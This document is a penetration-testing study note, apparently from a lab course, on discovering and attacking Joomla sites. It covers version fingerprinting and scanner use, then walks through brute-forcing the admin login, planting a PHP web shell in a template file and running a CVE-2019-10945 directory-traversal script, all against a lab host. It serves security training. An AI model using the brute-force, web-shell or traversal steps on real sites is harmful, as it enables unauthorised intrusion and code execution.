# Joomla – Discovery and Attacking

## Overview

Joomla is a free and open-source CMS released in **August 2005**. It is commonly used for:

- forums
- photo galleries
- e-commerce
- user communities
- general business sites

Like WordPress, it is written in **PHP** and typically uses **MySQL** on the backend.

Joomla is highly extensible, with:

- **7,000+ extensions**
- **1,000+ templates**

That flexibility also creates risk through:

- vulnerable extensions
- weak admin credentials
- exposed admin portals
- outdated core
- misconfiguration

## Useful context

Some stats from the notes:

- Joomla holds roughly **3.5% of CMS market share**
- powers roughly **3% of all websites**
- nearly **25,000 of the top 1 million sites**
- around **2.5–2.7 million installs**
- the community has close to **700,000 forum users**
- more than **770 developers** have contributed over time

Some well-known organisations using Joomla include:

- eBay
- Yamaha
- Harvard University
- the UK government

Joomla also exposes anonymous usage stats via a public API.

## Querying Joomla version stats

```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
```

Example output from the notes showed over **2.7 million installs**.

---

# 1. Discovery / Footprinting

If a site looks semi-custom but not fully bespoke, Joomla is worth checking for.

The goal is to confirm:

- whether Joomla is in use
- the version
- installed templates/extensions
- admin portal location
- any easy attack paths

## Page source fingerprinting

A quick indicator is the generator tag:

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

Example output:

```html
<meta name="generator" content="Joomla! - Open Source Content Management" />
```

That is a strong fingerprint.

---

# 2. `robots.txt`

A Joomla `robots.txt` often exposes its structure very clearly.

Typical example:

```text
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

## Why this matters

This is a dead giveaway for Joomla and also reveals useful directories such as:

- `/administrator/`
- `/components/`
- `/modules/`
- `/plugins/`
- `/templates/`

---

# 3. Favicon and Common Files

Joomla sometimes has a recognisable favicon, though not always.

More reliable version fingerprinting usually comes from files such as:

- `README.txt`
- `administrator/manifests/files/joomla.xml`
- `plugins/system/cache/cache.xml`
- versioned JS/media files

---

# 4. Version Fingerprinting

## `README.txt`

```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

Example:

```text
1- What is this?
    * This is a Joomla! installation/upgrade package to version 3.x
```

This gives an approximate version family.

---

## `joomla.xml`

A more precise method is:

```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

Example output included:

```xml
<version>3.9.4</version>
```

This is much more useful because it pins the exact version.

---

## `cache.xml`

The file:

```text
plugins/system/cache/cache.xml
```

can also help estimate version information.

---

# 5. Admin Portal

The Joomla administrator portal is usually at:

```text
/administrator/
```

or:

```text
/administrator/index.php
```

Example:

```text
http://dev.inlanefreight.local/administrator/index.php
```

This is the main login target for brute force, credential reuse, and post-auth abuse.

---

# 6. Tooling – `droopescan`

`droopescan` has limited but useful Joomla support.

## Install

```bash
sudo pip3 install droopescan
```

## Help

```bash
droopescan -h
droopescan scan --help
```

## Scan Joomla

```bash
droopescan scan joomla --url http://dev.inlanefreight.local/
```

## Findings from the notes

It returned:

- possible Joomla versions
- useful URLs
- admin login path
- `LICENSE.txt`
- `joomla.xml`
- `cache.xml`

Example useful URLs:

- `/administrator/`
- `/administrator/manifests/files/joomla.xml`
- `/LICENSE.txt`
- `/plugins/system/cache/cache.xml`

## Limitation

It did not reveal much beyond version hints and interesting paths.

Still useful as a quick first pass.

---

# 7. Tooling – JoomlaScan / joomlascan

A second tool mentioned was `joomlascan.py`.

It is:

- older
- Python 2.7 based
- somewhat outdated

But it can still help identify:

- accessible files
- exposed directories
- installed components
- possible extension clues

## Dependency setup (from notes)

```bash
pyenv shell 2.7
python2.7 -m pip install urllib3
python2.7 -m pip install certifi
python2.7 -m pip install bs4
```

## Example scan

```bash
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

## Useful output from the notes

It found:

- `robots.txt`
- components such as:
  - `com_actionlogs`
  - `com_admin`
  - `com_ajax`
  - `com_banners`
- explorable directories
- component XML / license files

## Why it matters

Even if the tool is dated, it may reveal:

- extension names
- exposed directories
- attack surface clues
- useful URLs for manual follow-up

---

# 8. Enumeration Summary

From the combined manual and automated enumeration in the notes, the environment looked like this:

- CMS confirmed as **Joomla**
- exact version confirmed as **3.9.4**
- admin portal at:
  - `/administrator/index.php`
- generic login error message prevents easy username enumeration
- exposed Joomla structure visible via:
  - `robots.txt`
  - `README.txt`
  - `joomla.xml`
- components/directories can be enumerated with tooling

---

# 9. Login Behaviour

Unlike WordPress, the Joomla login responses in the notes were generic.

Example message:

```text
Warning
Username and password do not match or you do not have an account yet.
```

## Why this matters

This makes user enumeration harder.

However, the notes mention that the default Joomla admin username is often:

```text
admin
```

The password is set during installation, so the most realistic login path is:

- weak/default password
- password guessing
- light brute forcing
- leaked credentials

---

# 10. Brute Forcing the Admin Portal

The notes used a brute force script against the Joomla admin portal.

## Example

```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Result

```text
admin:admin
```

That is a very realistic misconfiguration and a strong reminder to try:

- default creds
- weak common creds
- environment-specific defaults

before assuming the admin portal is hardened.

---

# 11. Post-Auth Abuse – Built-In Functionality

Once authenticated to the admin backend, Joomla can often be abused through built-in template editing.

This is similar in spirit to WordPress theme-editor abuse.

## Goal

Insert a small PHP snippet into a template file to gain code execution.

---

# 12. Helpful Fix for Broken Admin Panel

The notes mention a useful Joomla quirk.

If after login you see:

```text
An error has occurred. Call to a member function format() on null
```

navigate to:

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_plugins
```

and disable:

```text
Quick Icon - PHP Version Check
```

This restores proper control panel rendering.

---

# 13. Template Editing for RCE

From the admin dashboard:

- go to **Templates**
- then choose a template to customise

Example path:

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_templates
```

In the notes, the chosen template was:

- `protostar`

This opened the template customisation page.

---

# 14. File Choice for Web Shell

A good file to modify is something uncommon but web-accessible.

The notes chose:

```text
error.php
```

Example editor URL:

```text
http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D
```

## Why choose a non-standard parameter/file name

The notes correctly recommend:

- unusual parameter names
- non-obvious web shell naming
- optional password protection
- IP restriction if possible

This reduces accidental discovery during testing.

---

# 15. Joomla PHP One-Liner Shell

The example payload used:

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

That is better than using something obvious like `cmd`.

## Example execution

```bash
curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

Example output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

At that point, code execution as the web server user is confirmed.

From there, normal next steps are:

- interactive shell
- local enumeration
- privilege escalation
- lateral movement if in scope

---

# 16. Reporting / Cleanup

Any modification to a Joomla template is an artefact and must be handled properly.

You should:

- remove the PHP snippet when done
- note the exact file modified
- record the shell parameter name
- record the file path
- record hashes if relevant
- include it in the report appendix

Examples of items to log:

- system modified
- admin credentials used
- template edited
- file path
- parameter used
- shell snippet inserted
- whether cleanup succeeded

---

# 17. Known Vulnerabilities in Joomla

The notes mention:

- **426 Joomla-related CVEs**
- over **1,400 Exploit-DB entries**
- most entries relate to **extensions**, not core

Important takeaway:

**Joomla core RCE is relatively rare; extensions are usually where the real attack surface lives.**

Still, older core vulnerabilities absolutely matter if the version is stale.

---

# 18. Core Vulnerability Example – CVE-2019-10945

Because the target was identified as **Joomla 3.9.4**, it was a candidate for:

- **CVE-2019-10945**
- directory traversal
- authenticated arbitrary file deletion

## Notes on practicality

This issue is most interesting when:

- you already have credentials
- but cannot easily reach or use template editing
- or want filesystem visibility/deletion primitives

If you already have admin access and admin panel access, direct RCE via template editing is often simpler.

---

# 19. Example – Directory Traversal Script

The notes used an exploit script like:

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

## Result

It returned directory contents such as:

- `administrator`
- `bin`
- `cache`
- `cli`
- `components`
- `images`
- `includes`
- `language`
- `layouts`
- `libraries`
- `media`
- `modules`
- `plugins`
- `templates`
- `tmp`
- `LICENSE.txt`
- `README.txt`
- `configuration.php`
- `robots.txt`
- `web.config.txt`

## Why this matters

That can reveal:

- filesystem layout
- interesting config files
- extension locations
- files worth trying to read via other flaws
- opportunities for post-auth abuse

The notes also mention file deletion capability, though that is generally not useful for normal pentest goals unless explicitly part of agreed testing.

---

# 20. Practical Joomla Attack Paths from the Notes

Once Joomla is identified and versioned, the key attack paths are:

1. **weak/default admin credentials**
2. **admin login brute force**
3. **template editing → PHP code execution**
4. **extension enumeration and vulnerable extension exploitation**
5. **known core vulnerabilities if applicable**

---

# 21. Practical Workflow

## Step 1 – confirm Joomla

Check:

- page source
- `robots.txt`
- favicon
- `README.txt`

Useful command:

```bash
curl -s http://target/ | grep Joomla
```

## Step 2 – fingerprint version

Try:

```bash
curl -s http://target/README.txt | head -n 5
curl -s http://target/administrator/manifests/files/joomla.xml | xmllint --format -
```

## Step 3 – enumerate with tooling

```bash
droopescan scan joomla --url http://target/
python2.7 joomlascan.py -u http://target
```

## Step 4 – identify admin portal

Usually:

```text
/administrator/index.php
```

## Step 5 – test creds

Try:

- default creds
- weak guesses
- light brute force

Example from the notes:

```bash
sudo python3 joomla-brute.py -u http://target -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Step 6 – if admin access obtained, use template editing

Modify a template PHP file such as:

```text
/templates/protostar/error.php
```

## Step 7 – confirm RCE

```bash
curl -s "http://target/templates/protostar/error.php?<param>=id"
```

## Step 8 – evaluate known vulns

If version is vulnerable, consider:

- extension exploits
- core traversal issues
- file access/deletion paths
- config discovery

---

# 22. Useful Commands

## Confirm Joomla

```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

## Read README

```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

## Read joomla.xml

```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

## droopescan

```bash
droopescan scan joomla --url http://dev.inlanefreight.local/
```

## JoomlaScan

```bash
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

## Admin brute force example

```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Template-shell execution

```bash
curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

## CVE-2019-10945 traversal script

```bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

---

# 23. Key Takeaways

- Joomla is less common than WordPress but still very relevant
- page source, `robots.txt`, `README.txt`, and `joomla.xml` make fingerprinting straightforward
- admin portal is usually easy to identify
- generic login errors reduce username enumeration value
- weak/default admin credentials are still worth trying
- once authenticated, template editing can provide straightforward RCE
- most real Joomla risk usually comes from extensions rather than core
- if you modify template files, document and clean up carefully

---

# Tags

#joomla
#cms
#discovery
#enumeration
#droopescan
#joomlascan
#administrator
#template-editing
#rce
#php
#attacking-common-apps
#pentesting
#ctf
#obsidian